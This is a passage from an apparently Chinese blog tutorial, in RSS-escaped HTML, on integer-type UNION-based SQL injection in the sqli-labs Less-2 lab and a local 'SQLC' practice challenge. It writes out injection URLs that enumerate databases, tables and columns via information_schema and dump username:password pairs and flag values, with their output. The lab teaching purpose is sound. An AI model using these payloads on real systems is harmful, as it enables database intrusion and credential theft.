&lt;h4 id=&#34;2拼接多组内容在同一行输出-寻找所在库&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2拼接多组内容在同一行输出-寻找所在库&#34;&gt;#&lt;/a&gt; 2）拼接多组内容在同一行输出、寻找所在库&lt;/h4&gt;
&lt;p&gt;OK，我们在第二个占位符（也就是数字 2 所在的位置）上，看到输出了一个 schema_name，但是我们想要输出所有的 schema_name，怎么办？&lt;/p&gt;
&lt;p&gt;使用 MySQL 查询语句提供的 group_concat () 函数&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;39888&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(schema_name), schema_name &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到，原本占位符 2 所在的位置，已经被一组输出内容所替换。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928230746841.png&#34; alt=&#34;image-20220928230746841&#34;&gt;&lt;/p&gt;
&lt;p&gt;除了 group_concat ()，我们还可以使用：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#输出当前使用数据库的名称&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;database() &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#输出当前服务器中使用数据库的用户的名字和其对应的主机&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#输出当前数据库版本号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;version()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#输出该服务器数据库安装路径（数据库安装在哪里）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@&lt;span class=&#34;variable&#34;&gt;@basedir&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#输出数据库中数据的存放路径（该存放路径下有各个数据库的数据、数据库中表的数据）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@&lt;span class=&#34;variable&#34;&gt;@datadir&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#输出操作系统的版本号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@&lt;span class=&#34;variable&#34;&gt;@version&lt;/span&gt;_compile_os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#md5(str)可以对传入的字符串进行，d5加密，并返回加密后得到的&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;位字符串。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;md5(&lt;span class=&#34;string&#34;&gt;&amp;#x27;xxxx&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#使用某个拼接符拼接字符串&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;和字符串&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;concat_ws()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接着我们查询所在数据库的名字：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;39888&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(schema_name), database() &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;哦，原来是在 security 数据库中&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928231402676.png&#34; alt=&#34;image-20220928231402676&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;3确定想从某个库中拿到什么表从表中拿到什么列&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3确定想从某个库中拿到什么表从表中拿到什么列&#34;&gt;#&lt;/a&gt; 3）确定想从某个库中拿到什么表，从表中拿到什么列&lt;/h4&gt;
&lt;p&gt;我们看看从 security 库中都可以读取什么表？&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;核心&lt;/strong&gt; —— 在&lt;strong&gt; information_schema 库&lt;/strong&gt;的&lt;strong&gt; Tables 表&lt;/strong&gt;中，查询当 table_schema 的值为我们刚刚获取的 security 库时&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;39888&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(table_name), database() &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.tables &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; table_schema &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; database() #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928231639522.png&#34; alt=&#34;image-20220928231639522&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;获取到 security 库中的所有表为&lt;/strong&gt;： &lt;code&gt;emails&lt;/code&gt; 、 &lt;code&gt;referers&lt;/code&gt; 、 &lt;code&gt;uagents&lt;/code&gt; 、 &lt;code&gt;users&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们比较关心账号密码相关，所以眼光聚焦到 users 表。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;核心&lt;/strong&gt; —— 在&lt;strong&gt; information_schema 库&lt;/strong&gt;的&lt;strong&gt; Columns 表&lt;/strong&gt;中，查询当&lt;strong&gt; table_schema&lt;/strong&gt; 的值为我们刚刚获取的 &lt;code&gt;security&lt;/code&gt;  且 &lt;strong&gt;table_name&lt;/strong&gt; 为 &lt;code&gt;users&lt;/code&gt;  时&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;39888&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(column_name), database() &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.columns &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; table_schema &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; database() &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; table_name &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;users&amp;#x27;&lt;/span&gt; #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;获取到 security 库中，users 表里所有列为&lt;/strong&gt;： &lt;code&gt;id&lt;/code&gt; 、 &lt;code&gt;username&lt;/code&gt; 、 &lt;code&gt;password&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928232355430.png&#34; alt=&#34;image-20220928232355430&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们想要获取 username 和 password 的全部对应关系，使用 concat_ws 函数，把 username 和 password 用冒号拼接起来：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;核心&lt;/strong&gt; —— 由于已经知道了所在&lt;strong&gt; security 库&lt;/strong&gt;，&lt;strong&gt;users 表&lt;/strong&gt;，因此直接 &lt;code&gt;select xxxx from security.users&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;39888&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(concat_ws(&lt;span class=&#34;string&#34;&gt;&amp;#x27;:&amp;#x27;&lt;/span&gt;, username, password)), &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; security.users #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928232842359.png&#34; alt=&#34;image-20220928232842359&#34;&gt;&lt;/p&gt;
&lt;p&gt;小练习&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#&lt;span class=&#34;number&#34;&gt;1.&lt;/span&gt;查看注入类型&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;SQLC&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-1.&lt;/span&gt;php&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;SQLC&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-1.&lt;/span&gt;php&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; # 报错(整型和单引号都会报错)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#2.确定整型注入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=1 # (只有整型不会报错)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: Kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#3.确定列数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=1 union select 1, 2, 3 #&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: Kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#4.构造联合查询,确定所在库名。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), schema_name from information_schema.schemata #&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: challenge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: information_schema&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#5.确定在这个库中，都有什么表&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), group_concat(table_name) from information_schema.tables where table_schema = database()#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: challenge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: emails,flag,users&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#6.确定我们要找flag表，并看这个表中有什么列&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = &amp;#x27;&lt;/span&gt;flag&lt;span class=&#34;string&#34;&gt;&amp;#x27;#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: challenge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: flag,value&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#7.取列的值，另外把查询的from 后面改成对应的&amp;quot;库.表&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=2356 union select 1,database(), group_concat(concat_ws(&amp;#x27;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;#x27;, flag, value)) from challenge.flag#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: challenge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: flag1:mars,flag2:coobe,flag3:gir,flag4:margin,flag5:tubi,flag6:xss,flag7:any,flag8:sqlc,flag9:tasi,flag10:moo,flag12:false,flag11:muse&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;至此，整型注入演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
